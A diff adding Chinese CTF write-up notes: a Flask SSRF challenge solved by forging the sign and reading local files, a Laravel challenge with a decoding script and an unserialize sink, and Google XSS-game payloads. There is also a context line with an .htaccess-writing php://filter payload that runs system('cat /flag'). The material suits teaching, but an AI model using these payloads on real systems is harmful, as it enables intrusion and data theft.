@@ -287,6 +287,169 @@ Array
 
 
 
+### ssrf_me
+
+```python
+#! /usr/bin/env python
+#encoding=utf-8
+from flask import Flask
+from flask import request
+import socket
+import hashlib
+import urllib
+import sys
+import os
+import json
+reload(sys)
+sys.setdefaultencoding('latin1')
+
+app = Flask(__name__)
+
+secert_key = os.urandom(16)
+
+
+class Task:
+    def __init__(self, action, param, sign, ip):
+        self.action = action
+        self.param = param
+        self.sign = sign
+        self.sandbox = md5(ip)
+        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
+            os.mkdir(self.sandbox)
+
+    def Exec(self):
+        result = {}
+        result['code'] = 500
+        if (self.checkSign()):
+            if "scan" in self.action:
+                tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
+                resp = scan(self.param)
+                if (resp == "Connection Timeout"):
+                    result['data'] = resp
+                else:
+                    print resp
+                    tmpfile.write(resp)
+                    tmpfile.close()
+                result['code'] = 200
+            if "read" in self.action:
+                f = open("./%s/result.txt" % self.sandbox, 'r')
+                result['code'] = 200
+                result['data'] = f.read()
+            if result['code'] == 500:
+                result['data'] = "Action Error"
+        else:
+            result['code'] = 500
+            result['msg'] = "Sign Error"
+        return result
+
+    def checkSign(self):
+        if (getSign(self.action, self.param) == self.sign):
+            return True
+        else:
+            return False
+
+
+#generate Sign For Action Scan.
+@app.route("/geneSign", methods=['GET', 'POST'])
+def geneSign():
+    param = urllib.unquote(request.args.get("param", ""))
+    action = "scan"
+    return getSign(action, param)
+
+
+@app.route('/De1ta',methods=['GET','POST'])
+def challenge():
+    action = urllib.unquote(request.cookies.get("action"))
+    param = urllib.unquote(request.args.get("param", ""))
+    sign = urllib.unquote(request.cookies.get("sign"))
+    ip = request.remote_addr
+    if(waf(param)):
+        return "No Hacker!!!!"
+    task = Task(action, param, sign, ip)
+    return json.dumps(task.Exec())
+@app.route('/')
+def index():
+    return open("code.txt","r").read()
+
+
+def scan(param):
+    socket.setdefaulttimeout(1)
+    try:
+        return urllib.urlopen(param).read()[:50]
+    except:
+        return "Connection Timeout"
+
+
+
+def getSign(action, param):
+    return hashlib.md5(secert_key + param + action).hexdigest()
+
+
+def md5(content):
+    return hashlib.md5(content).hexdigest()
+
+
+def waf(param):
+    check=param.strip().lower()
+    if check.startswith("gopher") or check.startswith("file"):
+        return True
+    else:
+        return False
+
+
+if __name__ == '__main__':
+    app.debug = False
+    app.run(host='0.0.0.0')
+```
+
+hint:flag in ./flag
+
+
+
+#### 难点一:无法直接利用geneSign来获得read操作的sign值
+
+
+
+分析代码发现我们需要sign才能执行scan或者read操作，
+
+但是他们只提供给了我们scan操作,却没有read操作的sign,也就是说我们只能确定是否能访问我们提供的url。
+
+
+
+我们观察
+
+```python
+    param = urllib.unquote(request.args.get("param", ""))
+    action = "scan"
+    return hashlib.md5(secert_key + param + action).hexdigest()
+```
+
+发现param和action连在一起且param可控,再加上检查`if "read" in self.action` 是用in 来检查的,所以我们可以把read放在url里面，这样我们就能读取内容了
+
+#### 难点二:urlopen函数名的误导
+
+
+
+刚开始以为是用今年爆出来的urllib CLRF的漏洞结合redis拿到shell
+
+可是看了一下6379端口好像，没有运行redis
+
+看了wp后发现还可以直接读文件????
+
+![image.png](https://ws1.sinaimg.cn/large/006pWR9agy1g9e4mj3qjuj30j70dd756.jpg)
+
+emmm是我对urllib.urlopen的了解不够深
+
+>  `urllib.urlopen`(*url*[, *data*[, *proxies*[, *context*]]]) 
+>
+>Open a network object denoted by a URL for reading. If **the URL does not have a scheme identifier**, or if it has `file:` as its scheme identifier, **this opens a local file (without [universal newlines](https://docs.python.org/2/glossary.html#term-universal-newlines))**; otherwise it opens a socket to a server somewhere on the network. If the connection cannot be made the [`IOError`](https://docs.python.org/2/library/exceptions.html#exceptions.IOError) exception is raised. If all went well, a file-like object is returned. This supports the following methods: `read()`, [`readline()`](https://docs.python.org/2/library/readline.html#module-readline), `readlines()`, `fileno()`, `close()`, `info()`, `getcode()` and `geturl()`. It also has proper support for the [iterator](https://docs.python.org/2/glossary.html#term-iterator) protocol. One caveat: the `read()` method, if the size argument is omitted or negative, may not read until the end of the data stream; there is no good way to determine that the entire stream from a socket has been read in the general case. 
+
+
+
+
+
+
+
 ### Hack World
 
 > All You Want Is In Table 'flag' and the column is 'flag'
@@ -3173,3 +3336,194 @@ second.
 http://192.168.99.100:32772/?a=system('cat %2fflag');exit;&content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0ICAgIDAKDXBocF92YWx1ZSBhdXRvX2FwcGVuZF9maWxlICAgICIuaHRhY2Nlc3MiCg1waHBfdmFsdWUgcGNyZS5qaXQgICAwCg0KDSNhYTw%2FcGhwIGV2YWwoJF9HRVRbJ2EnXSk7Pz5c<<&filename=php://filter/write=convert.base64-decode/resource=.htaccess
 ```
 
+
+
+### 广外2019
+
+### laravel
+
+```
+[11:36:18] 301 -  338B  - /laravel/public/css  ->  http://183.129.189.60:10006/laravel/public/css/
+[11:36:25] 200 -    0B  - /laravel/public/favicon.ico
+[11:36:31] 200 -   25B  - /laravel/public/index.php
+[11:36:31] 301 -  337B  - /laravel/public/js  ->  http://183.129.189.60:10006/laravel/public/js/
+[11:36:45] 200 -  253B  - /laravel/public/robots.txt
+[11:36:53] 200 -    1KB - /laravel/public/web.config
+```
+
+
+
+web.config
+
+```xml
+<configuration>
+  <system.webServer>
+    <rewrite>
+      <rules>
+        <rule name="Imported Rule 1" stopProcessing="true">
+          <match url="^(.*)/$" ignoreCase="false" />
+          <conditions>
+            <add input="{REQUEST_FILENAME}" matchType="IsDirectory" ignoreCase="false" negate="true" />
+          </conditions>
+          <action type="Redirect" redirectType="Permanent" url="/{R:1}" />
+        </rule>
+        <rule name="Imported Rule 2" stopProcessing="true">
+          <match url="^" ignoreCase="false" />
+          <conditions>
+            <add input="{REQUEST_FILENAME}" matchType="IsDirectory" ignoreCase="false" negate="true" />
+            <add input="{REQUEST_FILENAME}" matchType="IsFile" ignoreCase="false" negate="true" />
+          </conditions>
+          <action type="Rewrite" url="index.php" />
+        </rule>
+      </rules>
+    </rewrite>
+  </system.webServer>
+</configuration>
+```
+
+
+
+robots.txt
+
+```python
+User-agent: *
+Disallow: /u_c4nNot_s3e_me
+
+Notice:
+l = len(m)
+for i in range(l):
+	num = (((m[i])+i) % 128 +128) % 128
+	code += chr(num)
+for i in range(l-1):
+	code[i] = code[i]^code[i+1]
+with open("u_c4nNot_s3e_me","wb") as f:
+	for i in code:
+		f.write(i)
+```
+
+```python
+s=b""
+with open("u_c4nNot_s3e_me","rb") as f:
+    s=f.read()
+code=[0]*len(s)
+for i in range(len(s)):
+    code[i]=int(s[i])
+for i in range(len(s)-2,-1,-1):
+    code[i]=(int(code[i])^int(code[i+1]))
+for i in range(len(code)):
+    print(chr((code[i]-i+128)%128),end="")
+
+
+```
+
+
+
+```php
+<?php public function index(){ echo 'Welcome to Hacker World !; if (isset($_GET['z'])){$z = $_GET['z']; unserialize($z);}}
+```
+
+百度一下拿到shell
+
+
+
+### 你的名字
+
+```
+ **Parse error:** syntax error, unexpected T_STRING, expecting '{' in **\var\WWW\html\test.php** on line **13** 
+```
+
+过滤file
+
+## google xss
+
+### level1
+
+`<script>alert()</script>`
+
+### level 2
+
+`<img src="aaaaaaaa.jpg" onerror="alert()"></img>`
+
+### level 3
+
+代码审计发现
+
+```javascript
+html += "<img src='/static/level3/cloud" + num + ".jpg' />";
+```
+
+
+
+```javascript
+#' onerror="alert()" '#1
+```
+
+### level 4
+
+关键代码
+
+```python
+self.render_template('timer.html', { 'timer' : timer })
+```
+
+测试发现过滤了,`(,"`无法闭合
+
+于是构造
+
+`https://xss-game.appspot.com/level4/frame?timer=1'%2balert()%2b'1`
+
+### level 5
+
+`https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert()`
+
+关键代码:`<a href="{{ next }}">Next >></a>`
+
+
+
+### level 6
+
+
+
+关键代码:
+
+```javascript
+    function includeGadget(url) {
+      var scriptEl = document.createElement('script');
+ 
+      // This will totally prevent us from loading evil URLs!
+      if (url.match(/^https?:\/\//)) {
+        setInnerText(document.getElementById("log"),
+          "Sorry, cannot load a URL containing \"http\".");
+        return;
+      }
+ 
+      // Load this awesome gadget
+      scriptEl.src = url;
+ 
+      // Show log messages
+      scriptEl.onload = function() { 
+        setInnerText(document.getElementById("log"),  
+          "Loaded gadget from " + url);
+      }
+      scriptEl.onerror = function() { 
+        setInnerText(document.getElementById("log"),  
+          "Couldn't load gadget from " + url);
+      }
+ 
+      document.head.appendChild(scriptEl);
+    }
+```
+
+
+
+网页会根据#号后面的内容创建script标签
+
+但是过滤了http和https为开始的url
+
+但是当我们输入//xxx的时候,浏览器会把当前网址的协议当做这个网址的协议,于是我们成功绕过过滤
+
+`//pastebin.com/raw/0eAVjVxh`
+
+
+
+这一题data**协议也能做**
